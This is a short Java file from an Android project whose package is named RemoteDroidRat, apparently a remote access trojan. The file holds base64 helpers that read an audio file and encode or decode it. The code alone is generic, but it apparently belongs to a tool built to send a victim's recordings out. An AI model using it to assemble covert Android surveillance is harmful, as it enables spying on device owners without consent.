package com.KaranKumar.RemoteDroidRat.EncoderDecoder.base64;

import android.util.Base64;

import java.io.FileInputStream;
import java.io.IOException;

public class base64Audio {

    public static String encodeAudioFromFile(String filePath) {
        try {
            FileInputStream fileInputStream = new FileInputStream(filePath);
            byte[] buffer = new byte[fileInputStream.available()];
            fileInputStream.read(buffer);
            fileInputStream.close();
            return Base64.encodeToString(buffer, Base64.DEFAULT);
        } catch (IOException e) {
            e.printStackTrace();
            return null;
        }
    }

    public static byte[] decodeAudio(String base64Audio) {
        try {
            return Base64.decode(base64Audio, Base64.DEFAULT);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
}
